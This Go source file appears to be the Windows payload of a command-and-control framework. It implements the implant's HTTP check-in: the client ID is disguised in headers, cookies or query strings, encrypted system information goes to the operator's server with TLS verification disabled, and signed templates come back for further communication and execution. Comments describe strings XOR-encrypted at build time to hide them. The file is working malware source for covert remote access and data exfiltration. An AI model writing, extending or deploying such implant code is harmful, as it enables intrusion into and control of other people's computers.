// server/docker/payloads/Windows/http.go
//go:build windows
// +build windows

package main

import (
	"bytes"
	"crypto"
	"crypto/rsa"
	"crypto/sha256"
	"crypto/tls"
	"crypto/x509"
	"encoding/base64"
	"encoding/json"
	"encoding/pem"
	"fmt"
	"io"
	"net/http"
	"time"
)

// HTTP strings are injected via ldflags (XOR encrypted) and decrypted at startup in getEnv.go
// Variables defined in main.go: httpHeaderUserAgent, httpHeaderContentType, httpHeaderPadPre,
// httpHeaderPadApp, httpMetaId, httpMetaEncryption, httpEncRsaAes

// placeInLocation places data in the specified HTTP location
// output format: "body", "header:<name>", "cookie:<name>", "query:<name>", "uri_append"
// prependLen and appendLen are NOT set here - X-Pad headers are only for POST body data
// For non-body locations (header/cookie/query), the server uses transform.Length directly
func placeInLocation(req *http.Request, output string, data []byte, prependLen, appendLen int) {
	locType, name := parseOutput(output)

	// NOTE: We don't set X-Pad headers here. Those are only for POST body data.
	// For clientID and other non-body data, the server uses the transform's Length
	// field directly for reversal (which is already in the config).

	switch locType {
	case "body":
		// Body is handled separately by the caller
		return
	case "header":
		req.Header.Set(name, string(data))
	case "cookie":
		req.AddCookie(&http.Cookie{Name: name, Value: string(data)})
	case "query":
		q := req.URL.Query()
		q.Set(name, string(data))
		req.URL.RawQuery = q.Encode()
	case "uri_append":
		req.URL.Path = req.URL.Path + string(data)
	}
}

// buildRequestWithTransforms creates an HTTP request with transformed clientID placed correctly
// Returns the request and body data (if output is "body")
func buildRequestWithTransforms(method, baseURL string, clientIDDataBlock *DataBlock, clientIDVal string, decrypted *DecryptedConfig) (*http.Request, []byte, error) {
	req, err := http.NewRequest(method, baseURL, nil)
	if err != nil {
		return nil, nil, fmt.Errorf(ErrCtx(E12, err.Error()))
	}

	var bodyData []byte

	if clientIDDataBlock != nil && len(clientIDDataBlock.Transforms) > 0 {
		// Apply transforms to clientID
		transformed, err := applyTransforms([]byte(clientIDVal), clientIDDataBlock.Transforms)
		if err != nil {
			return nil, nil, fmt.Errorf(ErrCtx(E18, err.Error()))
		}

		locType, _ := parseOutput(clientIDDataBlock.Output)
		if locType == "body" {
			bodyData = transformed.Data
			// Still set padding headers
			if transformed.PrependLength > 0 {
				req.Header.Set(httpHeaderPadPre, fmt.Sprintf("%d", transformed.PrependLength))
			}
			if transformed.AppendLength > 0 {
				req.Header.Set(httpHeaderPadApp, fmt.Sprintf("%d", transformed.AppendLength))
			}
		} else {
			placeInLocation(req, clientIDDataBlock.Output, transformed.Data, transformed.PrependLength, transformed.AppendLength)
		}
	} else {
		// Legacy: use query param with clientID name/format from decrypted values
		clientIDName := decrypted.GetClientIDName
		if clientIDName != "" {
			q := req.URL.Query()
			q.Set(clientIDName, clientIDVal)
			req.URL.RawQuery = q.Encode()
		}
	}

	return req, bodyData, nil
}

// PostData represents the structure of our post request body
type PostData struct {
	Data      string            `json:"data"`      // Our encrypted system info
	Metadata  map[string]string `json:"md"`  // Additional metadata
	Timestamp int64             `json:"ts"` // Current timestamp
}

type SignedResponse struct {
	Status             string `json:"st"`
	NewClientID        string `json:"nc"`
	SecretsInitialized bool   `json:"si"`
	Signature          string `json:"sg"`
	Seed               string `json:"seed"`
	CommsTemplate      string `json:"ct,omitempty"`  // Base64-encoded comms template
	ExecReqTemplate    string `json:"et,omitempty"`  // Base64-encoded exec requirements template
}

// parseCustomHeaders converts the JSON string of custom headers into a map
func parseCustomHeaders(headerJSON string) (map[string]string, error) {
	headers := make(map[string]string)
	err := json.Unmarshal([]byte(headerJSON), &headers)
	if err != nil {
		return nil, fmt.Errorf(ErrCtx(E18, err.Error()))
	}
	return headers, nil
}

func sendInitialPost(url string, encryptedData string, decrypted *DecryptedConfig) (string, error) {
	method := decrypted.PostMethod
	if method == "" {
		method = geMethodPost
	}

	postData := PostData{
		Data: encryptedData,
		Metadata: map[string]string{
			httpMetaId:         clientID,
			httpMetaEncryption: httpEncRsaAes,
		},
		Timestamp: time.Now().Unix(),
	}

	jsonData, err := json.Marshal(postData)
	if err != nil {
		return "", fmt.Errorf(ErrCtx(E18, err.Error()))
	}

	req, err := http.NewRequest(method, url, bytes.NewBuffer(jsonData))
	if err != nil {
		return "", fmt.Errorf(ErrCtx(E12, err.Error()))
	}

	customHeaders, err := parseCustomHeaders(decrypted.CustomHeaders)
	if err != nil {
		return "", fmt.Errorf(ErrCtx(E18, err.Error()))
	}

	req.Header.Set(httpHeaderUserAgent, decrypted.UserAgent)
	req.Header.Set(httpHeaderContentType, decrypted.ContentType)
	for key, value := range customHeaders {
		req.Header.Set(key, value)
	}

	// Debugging headers
	//fmt.Println("Request headers set:")

	// Custom HTTP client
	tr := &http.Transport{TLSClientConfig: &tls.Config{InsecureSkipVerify: true}}
	client := &http.Client{Transport: tr, Timeout: time.Second * 30}

	// Send request
	resp, err := client.Do(req)
	if err != nil {
		return "", fmt.Errorf(ErrCtx(E12, err.Error()))
	}
	defer resp.Body.Close()

	// Read response body
	bodyBytes, err := io.ReadAll(resp.Body)
	if err != nil {
		return "", fmt.Errorf(ErrCtx(E10, err.Error()))
	}

	// Parse the signed response
	var signedResponse SignedResponse
	if err := json.Unmarshal(bodyBytes, &signedResponse); err != nil {
		return "", fmt.Errorf(ErrCtx(E18, err.Error()))
	}

	// Verify the server's signature
	verificationData := fmt.Sprintf("%s:%s", signedResponse.NewClientID, signedResponse.Seed)
	hashed := sha256.Sum256([]byte(verificationData))

	// Parse server's public key
	block, _ := pem.Decode([]byte(decrypted.PublicKey))
	if block == nil {
		return "", fmt.Errorf(Err(E18))
	}

	publicKey, err := x509.ParsePKCS1PublicKey(block.Bytes)
	if err != nil {
		return "", fmt.Errorf(ErrCtx(E18, err.Error()))
	}

	// Decode signature
	signature, err := base64.StdEncoding.DecodeString(signedResponse.Signature)
	if err != nil {
		return "", fmt.Errorf(ErrCtx(E18, err.Error()))
	}

	// Verify signature
	if err := rsa.VerifyPKCS1v15(publicKey, crypto.SHA256, hashed[:], signature); err != nil {
		return "", fmt.Errorf(ErrCtx(E3, err.Error()))
	}

	// Parse and store comms template if provided
	if signedResponse.CommsTemplate != "" {
		if tplData, err := base64.StdEncoding.DecodeString(signedResponse.CommsTemplate); err == nil {
			var ct CommsTemplate
			if err := json.Unmarshal(tplData, &ct); err == nil {
				// Zero old template before replacing
				if globalCommsTpl != nil {
					globalCommsTpl.Zero()
				}
				globalCommsTpl = NewSecureTemplateFromSlices(ct.Version, ct.Type, ct.Templates, ct.Params)
				// Initialize Windows common APIs now that template is available
				initWindowsCommonAPIs()
			}
		}
	}

	// Parse and store exec requirements template if provided
	if signedResponse.ExecReqTemplate != "" {
		if tplData, err := base64.StdEncoding.DecodeString(signedResponse.ExecReqTemplate); err == nil {
			var et ExecReqTemplate
			if err := json.Unmarshal(tplData, &et); err == nil {
				setExecReqTemplate(&et)
			}
		}
	}

	// Return the new client ID if everything is verified
	if signedResponse.NewClientID == "" {
		return "", fmt.Errorf(Err(E18))
	}

	return signedResponse.NewClientID, nil
}
